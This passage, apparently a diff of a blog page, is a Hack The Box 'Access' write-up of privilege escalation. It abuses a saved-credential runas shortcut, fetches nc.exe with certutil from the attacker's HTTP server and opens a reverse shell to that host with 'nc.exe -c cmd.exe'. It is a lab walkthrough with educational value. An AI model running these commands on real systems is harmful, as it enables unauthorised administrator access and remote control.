-<h4 id="password-required-is-set-to-no--if-this-was-set-to-yes-we-wouldnt-be-able-to-use-runas-as-administrator-without-knowing-the-password--however-that-lnk-file-on-publics-desktop-was-a-nice-hint"><code class="highlighter-rouge">Password required</code> is set to <code class="highlighter-rouge">No</code> , If this was set to <code class="highlighter-rouge">Yes</code> we wouldn’t be able to use <code class="highlighter-rouge">runas</code> as administrator without knowing the password , However that <code class="highlighter-rouge">lnk</code> file on Public’s desktop was a nice hint.</h4>
-<h4 id="now-we-can-run-a-simple-http-server-on-our-box-with-python-and-host-ncexe--python--m-simplehttpserver-80-80-is-the-port-number-and-it-can-be-anything">Now we can run a simple HTTP server on our box with python and host <code class="highlighter-rouge">nc.exe</code> : <code class="highlighter-rouge">python -m SimpleHTTPServer 80</code> <code class="highlighter-rouge">80</code> is the port number and it can be anything</h4>
-<h4 id="you-can-get-ncexe-from-github-here--i-also-remember-that-i-included-another-link-in-secnotes-write-up">You can get <code class="highlighter-rouge">nc.exe</code> from github <a href="https://github.com/diegocr/netcat/blob/master/nc.exe">here</a> , I also remember that I included another link in <a href="/hack-the-box/secnotes">SecNotes write-up</a></h4>
-<h4 id="then-we-will-download-it-on-the-box-">Then we will download it on the box :</h4>
-<p><code class="highlighter-rouge">certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe</code>
-<img src="/images/hackthebox/access/22.png" alt="" /></p>
-<h4 id="after-that-we-will-set-up-our-nc-listener-nc--lvnp-1337-1337-is-the-port-number-and-it-can-be-anything">After that we will set up our nc listener <code class="highlighter-rouge">nc -lvnp 1337</code> <code class="highlighter-rouge">1337</code> is the port number and it can be anything.</h4>
-<h4 id="finally-we-will-use-runas-to-get-a-reverse-shell-">Finally we will use <code class="highlighter-rouge">runas</code> to get a reverse shell :</h4>
-<p><code class="highlighter-rouge">runas /user:Administrator /savecred "nc.exe -c cmd.exe 10.10.xx.xx 1337"</code>
-<img src="/images/hackthebox/access/23.png" alt="" /></p>
-<h4 id="lets-check-our-listener-">Let’s check our listener :</h4>
-<p><img src="/images/hackthebox/access/24.png" alt="" /></p>
-<h4 id="we-have-a-shell">We have a shell.</h4>
-<p><img src="/images/hackthebox/access/25.png" alt="" /></p>
-<h4 id="and-we-owned-root-">And we owned root !</h4>
-<p><br />
-<br /></p>
-<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
-<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
-<h4 id="thanks-for-reading">Thanks for reading.</h4>
-<p><br />
-<br /></p>
-<h4 id="previous-hack-the-box-write-up--hack-the-box---zipper">Previous Hack The Box write-up : <a href="/hack-the-box/zipper/">Hack The Box - Zipper</a></h4>
-<h4 id="next-hack-the-box-write-up--hack-the-box---ethereal">Next Hack The Box write-up : <a href="/hack-the-box/ethereal/">Hack The Box - Ethereal</a></h4>
+<h2 id="runas-and-privilege-escalation">runas and Privilege Escalation</h2>
+<p><br /> As always we will start enumerating the filesystem , There are only 3 users on the box <code class="highlighter-rouge">Administrator</code> , <code class="highlighter-rouge">Public</code> and <code class="highlighter-rouge">security</code>.
+<img src="/images/hackthebox/access/18.png" alt="" />
+<br /> We are in as <code class="highlighter-rouge">security</code> and we can’t go into Administrator’s directory so let’s check Public.
+<br /> In the Desktop of <code class="highlighter-rouge">Public</code> there’s a <code class="highlighter-rouge">lnk</code> called <code class="highlighter-rouge">ZKAccess3.5 Security System</code>.
+<img src="/images/hackthebox/access/19.png" alt="" />
+<br /> Let’s <code class="highlighter-rouge">type</code> it and see what’s inside it :
+<img src="/images/hackthebox/access/20.png" alt="" />
+<br /> Of course not the best output , because it’s a <code class="highlighter-rouge">lnk</code> file not a <code class="highlighter-rouge">txt</code> file , but we can read some stuff , and we notice that there’s a <code class="highlighter-rouge">runas</code> command being excuted as administrator. <code class="highlighter-rouge">runas</code> allows us to run commands as another user and the option <code class="highlighter-rouge">/savecred</code> allows us to use the command without asking for password. Looking into Public’s desktop is not necessary to know that, we can check by executing <code class="highlighter-rouge">net user administrator</code>
+<img src="/images/hackthebox/access/21.png" alt="" />
+<br /> <code class="highlighter-rouge">Password required</code> is set to <code class="highlighter-rouge">No</code> , If this was set to <code class="highlighter-rouge">Yes</code> we wouldn’t be able to use <code class="highlighter-rouge">runas</code> as administrator without knowing the password , However that <code class="highlighter-rouge">lnk</code> file on Public’s desktop was a nice hint.
+<br /> Now we can run a simple HTTP server on our box with python and host <code class="highlighter-rouge">nc.exe</code> : <code class="highlighter-rouge">python -m SimpleHTTPServer 80</code> <code class="highlighter-rouge">80</code> is the port number and it can be anything 
+<br /> You can get <code class="highlighter-rouge">nc.exe</code> from github <a href="https://github.com/diegocr/netcat/blob/master/nc.exe">here</a> , I also remember that I included another link in <a href="/hack-the-box/secnotes">SecNotes write-up</a>
+<br /> Then we will download it on the box :
+<code class="highlighter-rouge">certutil -urlcache -split -f http://10.10.xx.xx/nc.exe nc.exe</code>
+<img src="/images/hackthebox/access/22.png" alt="" />
+<br /> After that we will set up our nc listener <code class="highlighter-rouge">nc -lvnp 1337</code> <code class="highlighter-rouge">1337</code> is the port number and it can be anything.
+<br /> Finally we will use <code class="highlighter-rouge">runas</code> to get a reverse shell :
+<code class="highlighter-rouge">runas /user:Administrator /savecred "nc.exe -c cmd.exe 10.10.xx.xx 1337"</code>
+<img src="/images/hackthebox/access/23.png" alt="" />
+<br /> Let’s check our listener :
+<img src="/images/hackthebox/access/24.png" alt="" />
+<br /> We have a shell.
+<img src="/images/hackthebox/access/25.png" alt="" />
+<br /> And we owned root !
+<br />
+<br />
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Hack The Box write-up : <a href="/hack-the-box/zipper/">Hack The Box - Zipper</a>
+<br /> Next Hack The Box write-up : <a href="/hack-the-box/ethereal/">Hack The Box - Ethereal</a></p>
 <hr />
 
 
-  </div>
-<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/access/" hidden></a>
-</article>
-
-      </div>
-    </main><footer class="site-footer h-card">
-  <data class="u-url" href="/"></data>
-
-  <div class="wrapper">
-
-    <h2 class="footer-heading">0xRick Owned Root !</h2>
-
-    <div class="footer-col-wrapper">
-      <div class="footer-col footer-col-1">
-        <ul class="contact-list">
-          <li class="p-name">0xRick Owned Root !</li></ul>
-      </div>
-
-      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
 </div>
 
-      <div class="footer-col footer-col-3">
-        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
+
+
+
+
+<div class="related">
+  <h2>other posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/pwn/collision/">
+            pwnable.kr - collision
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/unattended/">
+            Hack The Box - Unattended
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/helpline/">
+            Hack The Box - Helpline
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-3">binary-exploitation</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-1">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/exploit-development/" class="set-1">exploit development</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-5">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-3">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/wordpress/" class="set-1">wordpress</a></div>
+  
+
+
+
       </div>
-    </div>
+    </main><footer class="site-footer">
+	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
+  <div class="wrapper"><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
 
+if (theme === "dark") {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+} else if (theme === "light") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+} else if  (userPrefers === "dark") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'dark');
+	document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	window.localStorage.setItem('theme', 'dark');
+	document.getElementById("theme-toggle").className = 'light';
+} else {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'light');
+	document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	window.localStorage.setItem('theme', 'light');
+	document.getElementById("theme-toggle").className = 'dark';
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    document.documentElement.setAttribute('data-theme', 'light');
+		document.documentElement.classList.add('theme--light');
+        document.documentElement.classList.remove('theme--dark');
+		window.localStorage.setItem('theme', 'light');
+	    document.getElementById("theme-toggle").className = 'dark';
+	} else {
+	    document.documentElement.setAttribute('data-theme', 'dark');
+		document.documentElement.classList.add('theme--dark');
+        document.documentElement.classList.remove('theme--light');
+		window.localStorage.setItem('theme', 'dark');
+	    document.getElementById("theme-toggle").className = 'light';
+	}
+}
+</script></div>
   </div>
-
 </footer>
-</body>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
 
 </html>
-
